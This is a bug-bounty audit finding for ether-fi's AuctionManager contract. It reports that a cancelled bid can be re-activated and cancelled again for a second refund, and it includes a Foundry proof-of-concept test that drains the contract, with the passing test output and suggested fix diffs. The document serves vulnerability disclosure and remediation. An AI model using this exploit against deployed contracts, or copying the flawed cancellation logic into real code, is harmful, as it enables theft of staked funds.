# [H] In `AuctionManager` contract: cancelling a bid by the original bidder doesn't fully remove the bid which might lead to the same bid being re-activated by the manager

## Summary
Severity: High
Chain: Smart contract
Component: ether-fi
Published: 2023-11-08
Source: https://github.com/hats-finance/ether-fi-0x36c3b77853dec9c4a237a692623293223d4b9bc4/issues/29
Type: hats-finding

## Details
**Github username:** @@DevHals
**Submission hash (on-chain):** 0x36d22b6619524fd2e86dc393935b477f7bb867d94ec9dfa4d45ccd73be5fb428
**Severity:** high

**Description:**
**Description**
- In `AuctionManager` contract: any whitelisted node operator can create a bid/bids; when doing so, they send the contract an amount of native tokens equals to the `_bidSize * _bidAmountPerBid`.

- The bidder (bid creator) can cancel the bid by calling `AuctionManager.cancelBid` function; where the bid is deactivated (`bid.isActive = false`) and the bid amount is sent back to the bidder.

  ```solidity
  function _cancelBid(uint256 _bidId) internal {
        Bid storage bid = bids[_bidId];
        require(bid.bidderAddress == msg.sender, "Invalid bid");
        require(bid.isActive, "Bid already cancelled");

        // Cancel the bid by de-activating it
        bid.isActive = false;
        numberOfActiveBids--;

        // Refund the user with their bid amount
        (bool sent, ) = msg.sender.call{value: bid.amount}("");
        require(sent, "Failed to send Ether");

        emit BidCancelled(_bidId);
     }
  ```

- As can be noticed; the bid is not deleted from the `bids` array; only its activity is set to `false`.
- 
**Attack Scenario**
- The `AuctionManager` contract has a functionality that enables the `StakingManagerContract` from deactivating any active bid (setting ` bid.isActive = false`) by calling the `updateSelectedBidInformation` function, and again it can activate the bid by calling `reEnterAuction` on the deactivated bid.

- But the `reEnterAuction` can be called on a bid that has been cancelled by the bidder (where he was refunded the bid amount).

- So if the `reEnterAuction` function is called on the withdrawn bid; the bidder can re-cancel this bid again and get the value of the bid for the second time, which will result in contract losing from its funds.

**Attachments**

1. **Proof of Concept (PoC) File**
- Set the following test (attached) in the `AuctionManager.t.sol` test file:

  ```solidity
  function test_CancelledBidCanBeReActivated() public {
        address bidder = 0xCd5EBC2dD4Cb3dc52ac66CEEcc72c838B40A5931;

        //1. a node operator is registered and added to the whitelist:
        vm.prank(bidder);
        nodeOperatorManagerInstance.registerNodeOperator(aliceIPFSHash, 5);

        //2.the node operator creates a bid:
        uint256 auctionContractBalance = address(auctionInstance).balance;
        assertEq(auctionContractBalance, 0);
        hoax(bidder);
        uint256 bidAmount = 0.1 ether;

        uint256[] memory bid1Id = auctionInstance.createBid{value: bidAmount}(
              1,
              bidAmount
        );

        assertEq(
              auctionContractBalance + bidAmount,
              address(auctionInstance).balance
        );

        //3. another bid is created by another operator with the same number of bids so that the auction contract has some funds to be stolen by the bidder:
        startHoax(alice);
        nodeOperatorManagerInstance.registerNodeOperator(aliceIPFSHash, 10);

        uint256[] memory bidIds = auctionInstance.createBid{value: bidAmount}(
              1,
              bidAmount
        );
        vm.stopPrank();

        assertEq(
              auctionContractBalance + bidAmount * 2,
              address(auctionInstance).balance
        );

        //4.the node operator cancels the bid:
        hoax(bidder);
        auctionInstance.cancelBidBatch(bid1Id);
        assertEq(auctionInstance.isBidActive(bid1Id[0]), false);

        assertEq(
              auctionContractBalance + bidAmount,
              address(auctionInstance).balance
        );
        //5.the staking manager reActivates the withdrawn bid
        vm.startPrank(address(stakingManagerInstance));
        auctionInstance.reEnterAuction(bid1Id[0]);
        vm.stopPrank();
        assertEq(auctionInstance.isBidActive(bid1Id[0]), true);

        //6.the node operator re-cancels the bid again and refunded the bid amount for the second time:
        hoax(bidder);
        auctionInstance.cancelBidBatch(bid1Id);
        assertEq(address(auctionInstance).balance, 0); //drained
     }
  ```

- Test Result:

  ```bash
  $ forge test --mt test_CancelledBidCanBeReActivated
  Running 1 test for test/AuctionManager.t.sol:AuctionManagerTest
  [PASS] test_CancelledBidCanBeReActivated() (gas: 381516)
  Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 30.94ms
  Ran 1 test suites: 1 tests passed, 0 failed, 0 skipped (1 total tests)
  ```


2. **Revised Code File (Optional)**
When cancelling a bid by the bidder; update the `bid.bidderAddress=address(0)`, and when the staking manager calls the `reEnterAuction` on any bid; a check is made before deactivating a bid if it has been cancelled by the bidder or not by checking the `bid.bidderAddress != address(0)`:

[AuctionManager.\_cancelBid function](https://github.com/hats-finance/ether-fi-0x36c3b77853dec9c4a237a692623293223d4b9bc4/blob/ec7d11c943b545994cd3266b9aa17affde754d9e/src/AuctionManager.sol#L256-L270)

```diff
function _cancelBid(uint256 _bidId) internal {
        Bid storage bid = bids[_bidId];
        require(bid.bidderAddress == msg.sender, "Invalid bid");
        require(bid.isActive, "Bid already cancelled");

        // Cancel the bid by de-activating it
        bid.isActive = false;
+       bid.bidderAddress = address(0);
        numberOfActiveBids--;

        // Refund the user with their bid amount
        (bool sent, ) = msg.sender.call{value: bid.amount}("");
        require(sent, "Failed to send Ether");

        emit BidCancelled(_bidId);
    }
```

[AuctionManager.reEnterAuction function](https://github.com/hats-finance/ether-fi-0x36c3b77853dec9c4a237a692623293223d4b9bc4/blob/ec7d11c943b545994cd3266b9aa17affde754d9e/src/AuctionManager.sol#L193-L202)

```diff
    function reEnterAuction(
        uint256 _bidId
    ) external onlyStakingManagerContract {
        Bid storage bid = bids[_bidId];
        require(!bid.isActive, "Bid already active");
+       require(bid.bidderAddress != address(0), "Bid is cancelled by the bidder");

        bid.isActive = true;
        numberOfActiveBids++;
        emit BidReEnteredAuction(_bidId);
    }
```
  
**Files:**
  - PoC.t.sol (https://hats-backend-prod.herokuapp.com/v1/files/QmZEXRoiCX8Ttr8TueM6RrWemMXQuLmVWZAKqScqYp8fQZ)
